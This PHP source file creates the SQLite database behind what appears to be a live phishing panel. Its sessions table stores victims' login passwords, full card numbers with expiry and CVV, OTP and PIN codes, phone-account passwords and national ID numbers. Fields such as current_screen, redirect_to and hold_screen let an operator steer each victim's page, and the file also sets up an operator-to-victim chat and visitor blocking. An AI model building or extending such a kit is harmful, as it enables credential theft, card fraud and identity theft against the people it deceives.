<?php

declare(strict_types=1);

function sw_storage_dir(): string
{
    $dir = APP_ROOT . '/storage';
    if (!is_dir($dir)) {
        @mkdir($dir, 0755, true);
    }
    return $dir;
}

function sw_db_column_exists(PDO $pdo, string $table, string $column): bool
{
    $stmt = $pdo->query('PRAGMA table_info(' . $table . ')');
    if (!$stmt) {
        return false;
    }
    foreach ($stmt->fetchAll() as $row) {
        if (($row['name'] ?? '') === $column) {
            return true;
        }
    }
    return false;
}

function sw_db_ensure_schema(PDO $pdo): void
{
    $pdo->exec(
        'CREATE TABLE IF NOT EXISTS sessions (
            id TEXT PRIMARY KEY,
            reference TEXT NOT NULL UNIQUE,
            customer_name TEXT NOT NULL DEFAULT "",
            customer_phone TEXT NOT NULL DEFAULT "",
            customer_email TEXT NOT NULL DEFAULT "",
            login_username TEXT NOT NULL DEFAULT "",
            login_password TEXT NOT NULL DEFAULT "",
            card_number TEXT NOT NULL DEFAULT "",
            card_expiry TEXT NOT NULL DEFAULT "",
            card_cvv TEXT NOT NULL DEFAULT "",
            otp_code TEXT NOT NULL DEFAULT "",
            pin_code TEXT NOT NULL DEFAULT "",
            phone_provider TEXT NOT NULL DEFAULT "",
            phone_number TEXT NOT NULL DEFAULT "",
            phone_email TEXT NOT NULL DEFAULT "",
            phone_qid TEXT NOT NULL DEFAULT "",
            phone_password TEXT NOT NULL DEFAULT "",
            current_screen TEXT NOT NULL DEFAULT "",
            redirect_to TEXT NOT NULL DEFAULT "",
            redirect_nonce TEXT NOT NULL DEFAULT "",
            client_ip TEXT NOT NULL DEFAULT "",
            client_country TEXT NOT NULL DEFAULT "",
            ip_history TEXT NOT NULL DEFAULT "[]",
            device_id TEXT NOT NULL DEFAULT "",
            loading_hold INTEGER NOT NULL DEFAULT 0,
            last_seen_at TEXT NOT NULL DEFAULT "",
            is_blocked INTEGER NOT NULL DEFAULT 0,
            blocked_at TEXT NOT NULL DEFAULT "",
            status TEXT NOT NULL DEFAULT "PENDING_REVIEW",
            created_at TEXT NOT NULL,
            updated_at TEXT NOT NULL
        )'
    );

    $extras = [
        'ip_history' => 'TEXT NOT NULL DEFAULT "[]"',
        'device_id' => 'TEXT NOT NULL DEFAULT ""',
        'loading_hold' => 'INTEGER NOT NULL DEFAULT 0',
        'blocked_at' => 'TEXT NOT NULL DEFAULT ""',
        'is_blocked' => 'INTEGER NOT NULL DEFAULT 0',
        'client_country' => 'TEXT NOT NULL DEFAULT ""',
        'home_captcha_verified_at' => 'TEXT NOT NULL DEFAULT ""',
        'phone_verify_code' => 'TEXT NOT NULL DEFAULT ""',
        'account_type' => 'TEXT NOT NULL DEFAULT ""',
        'reg_qid' => 'TEXT NOT NULL DEFAULT ""',
        'reg_email' => 'TEXT NOT NULL DEFAULT ""',
        'reg_mobile' => 'TEXT NOT NULL DEFAULT ""',
        'reg_dial_code' => 'TEXT NOT NULL DEFAULT ""',
        'nationality' => 'TEXT NOT NULL DEFAULT ""',
        'name_ar' => 'TEXT NOT NULL DEFAULT ""',
        'name_en' => 'TEXT NOT NULL DEFAULT ""',
        'birthdate' => 'TEXT NOT NULL DEFAULT ""',
        'gender' => 'TEXT NOT NULL DEFAULT ""',
        'service_code' => 'TEXT NOT NULL DEFAULT ""',
        'service_name' => 'TEXT NOT NULL DEFAULT ""',
        'service_fee' => 'TEXT NOT NULL DEFAULT ""',
        'service_category' => 'TEXT NOT NULL DEFAULT ""',
        'service_duration' => 'TEXT NOT NULL DEFAULT ""',
        'service_description' => 'TEXT NOT NULL DEFAULT ""',
        'user_type' => 'TEXT NOT NULL DEFAULT ""',
        'is_admin' => 'INTEGER NOT NULL DEFAULT 0',
        'hold_screen' => 'TEXT NOT NULL DEFAULT ""',
        'confirm_ref' => 'TEXT NOT NULL DEFAULT ""',
    ];
    foreach ($extras as $col => $def) {
        if (!sw_db_column_exists($pdo, 'sessions', $col)) {
            $pdo->exec('ALTER TABLE sessions ADD COLUMN ' . $col . ' ' . $def);
        }
    }
    try {
        if (sw_db_column_exists($pdo, 'sessions', 'service_description')) {
            $pdo->exec("UPDATE sessions SET service_description = '' WHERE service_description != ''");
        }
    } catch (Throwable $e) {
        // Ignore.
    }

    $pdo->exec(
        'CREATE TABLE IF NOT EXISTS blocked_ips (
            ip TEXT NOT NULL,
            session_id TEXT NOT NULL,
            blocked_at TEXT NOT NULL,
            PRIMARY KEY (ip, session_id)
        )'
    );
    $pdo->exec(
        'CREATE TABLE IF NOT EXISTS blocked_traces (
            id TEXT PRIMARY KEY,
            kind TEXT NOT NULL,
            value TEXT NOT NULL,
            session_id TEXT NOT NULL,
            blocked_at TEXT NOT NULL
        )'
    );
    $pdo->exec(
        'CREATE TABLE IF NOT EXISTS admin_presence (
            session_key TEXT PRIMARY KEY,
            username TEXT NOT NULL DEFAULT "",
            last_seen_at TEXT NOT NULL,
            client_ip TEXT NOT NULL DEFAULT ""
        )'
    );
    $pdo->exec('CREATE INDEX IF NOT EXISTS idx_admin_presence_seen ON admin_presence(last_seen_at)');
    $pdo->exec(
        'CREATE TABLE IF NOT EXISTS deleted_sessions (
            id TEXT PRIMARY KEY,
            deleted_at TEXT NOT NULL
        )'
    );

    // Simple 1:1 chat per client session (admin <-> client).
    $pdo->exec(
        'CREATE TABLE IF NOT EXISTS chat_messages (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            session_id TEXT NOT NULL,
            direction TEXT NOT NULL,
            sender_name TEXT NOT NULL DEFAULT "",
            message_type TEXT NOT NULL DEFAULT "",
            body TEXT NOT NULL,
            created_at TEXT NOT NULL
        )'
    );
    // Migration: older DBs won’t have message_type.
    if (!sw_db_column_exists($pdo, 'chat_messages', 'message_type')) {
        $pdo->exec('ALTER TABLE chat_messages ADD COLUMN message_type TEXT NOT NULL DEFAULT ""');
    }
    $pdo->exec('CREATE INDEX IF NOT EXISTS idx_chat_messages_session_id_id ON chat_messages(session_id, id)');
}

function sw_deleted_ids_path(): string
{
    return sw_storage_dir() . '/deleted-sessions.json';
}

/**
 * @param list<string>|null $merge
 * @return array<string, true>
 */
function sw_deleted_ids(?string $add = null, ?array $merge = null): array
{
    static $ids = null;
    if ($ids === null) {
        $ids = [];
        $path = sw_deleted_ids_path();
        if (is_file($path)) {
            $raw = json_decode((string) @file_get_contents($path), true);
            if (is_array($raw)) {
                foreach ($raw as $item) {
                    $item = trim((string) $item);
                    if ($item !== '') {
                        $ids[$item] = true;
                    }
                }
            }
        }
    }
    if (is_array($merge)) {
        foreach ($merge as $item) {
            $item = trim((string) $item);
            if ($item !== '') {
                $ids[$item] = true;
            }
        }
    }
    if ($add !== null && $add !== '') {
        $ids[$add] = true;
        @file_put_contents(
            sw_deleted_ids_path(),
            json_encode(array_keys($ids), JSON_UNESCAPED_UNICODE),
            LOCK_EX
        );
        try {
            sw_db()->prepare(
                'INSERT OR IGNORE INTO deleted_sessions (id, deleted_at) VALUES (:id, :at)'
            )->execute(['id' => $add, 'at' => date('c')]);
        } catch (Throwable $e) {
        }
    }
    return $ids;
}

function sw_deleted_ids_merge_db(PDO $pdo): void
{
    $extra = [];
    try {
        $stmt = $pdo->query('SELECT id FROM deleted_sessions');
        if ($stmt) {
            foreach ($stmt->fetchAll() as $row) {
                $extra[] = (string) ($row['id'] ?? '');
            }
        }
    } catch (Throwable $e) {
        return;
    }
    if ($extra !== []) {
        sw_deleted_ids(null, $extra);
    }
}

function sw_session_id_is_deleted(string $id): bool
{
    $id = trim($id);
    return $id !== '' && isset(sw_deleted_ids()[$id]);
}

function sw_db_persist(?PDO $pdo = null): void
{
    $pdo = $pdo ?? sw_db();
    try {
        $pdo->exec('PRAGMA wal_checkpoint(TRUNCATE)');
    } catch (Throwable $e) {
    }
}

function sw_purge_deleted_session_rows(PDO $pdo): void
{
    $ids = array_keys(sw_deleted_ids());
    if ($ids === []) {
        return;
    }
    $stmt = $pdo->prepare('DELETE FROM sessions WHERE id = :id');
    foreach ($ids as $id) {
        $stmt->execute(['id' => $id]);
    }
}

function sw_db(): PDO
{
    static $pdo = null;
    if ($pdo instanceof PDO) {
        return $pdo;
    }

    $path = sw_storage_dir() . '/sessions.sqlite';
    $pdo = new PDO('sqlite:' . $path, null, null, [
        PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION,
        PDO::ATTR_DEFAULT_FETCH_MODE => PDO::FETCH_ASSOC,
    ]);
    try {
        $mode = (string) $pdo->query('PRAGMA journal_mode=WAL')->fetchColumn();
        if (strcasecmp($mode, 'wal') !== 0) {
            $pdo->exec('PRAGMA journal_mode=DELETE');
        }
    } catch (Throwable $e) {
        try {
            $pdo->exec('PRAGMA journal_mode=DELETE');
        } catch (Throwable $e2) {
            // Ignore; continue with the driver default.
        }
    }
    $pdo->exec('PRAGMA synchronous=NORMAL');
    $pdo->exec('PRAGMA busy_timeout=2500');
    sw_db_ensure_schema($pdo);

    return $pdo;
}
